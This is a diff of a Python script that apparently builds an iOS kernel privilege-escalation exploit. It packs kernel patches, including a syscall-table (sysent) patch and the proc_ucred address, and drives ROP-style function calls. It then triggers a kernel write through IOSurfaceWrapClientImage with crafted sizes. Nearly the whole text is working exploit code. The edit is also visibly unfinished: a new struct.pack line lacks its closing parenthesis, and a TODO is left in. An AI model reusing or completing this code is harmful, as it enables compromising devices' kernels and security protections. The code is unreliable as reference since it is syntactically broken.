@@ -31,7 +31,7 @@ def dbg_result():
 dmini.init(kernfile, False)
 
 proc_ucred = dmini.cur.sym('_proc_ucred')
-weirdfile = Connection('kcode.o', False).nth_segment(0)[:-4] + struct.pack('I', proc_ucred)
+weirdfile = Connection('kcode.o', False).nth_segment(0)
 while True:
     namelen = patchfp.read(4)
     if len(namelen) == 0: break
@@ -48,7 +48,8 @@ while True:
     if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
         continue
     weirdfile += struct.pack('II', addr, len(data)) + data
-weirdfile += struct.pack('IIII', sysent_patch, 4, sysent_patch_orig, 0)
+# TODO troll string and I()
+weirdfile += struct.pack('IIIII', sysent_patch, 4, sysent_patch_orig, 0, proc_ucred
 
 #set_fwd('PC0', dmini.cur.find_basic('- 00 f0 96 e8')) # ldm r6, {ip, sp, lr, pc}
 #set_fwd('PC0', dmini.cur.find_basic('- 00 f0 b4 e9')) # ldm r4!, {ip, sp, lr, pc}
@@ -58,8 +59,8 @@ make_avail()
 code_addr = 0x80000400 # xxx
 funcall('_memcpy', code_addr, ptr(weirdfile), len(weirdfile))
 set_fwd('PC', code_addr)
-kstuff = finalize(0x1000)
-assert len(kstuff) < 0x1000
+kstuff = finalize(None)
+print 'len:', len(kstuff)
 
 dmini.init(cachefile, True)
 
@@ -114,15 +115,9 @@ if mode == 'dejavu':
     memory_entry, memory_entryp = stackunkpair()
     funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()
 
-funcall('_vm_deallocate', mtss.pop(), 0x1000, 0x1000); dbg_result()
+kptr = ptr(kstuff)
 
-
-funcall('_vm_allocate', mtss.pop(), 0x1000, 0x1000, 0); dbg_result()
-funcall('_memcpy', 0x1000, ptr(kstuff), len(kstuff))
-
-funcall('_mlock', 0x1000, 0x1000); dbg_result()
-
-w, h = 1, 0x1000
+w, h = 1, kptr + 4
 funcall('_IOSurfaceWrapClientImage', 0x41424752, w, h, 4, 4*w*h, 0)
 dbg_result(); funcall('_abort')
 surface, surfacep = stackunkpair()
@@ -147,12 +142,6 @@ funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
 if mode == 'dejavu':
     funcall('_CFRelease', surface)
     funcall('_IOSurfaceClose', connect, load_r0=True)
-
-    funcall('_munlock', 0, 0x2000); dbg_result()
-    funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
-    funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0); dbg_result()
-    funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0); dbg_result()
-    funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2); dbg_result()
 
     # the boring stuff
 
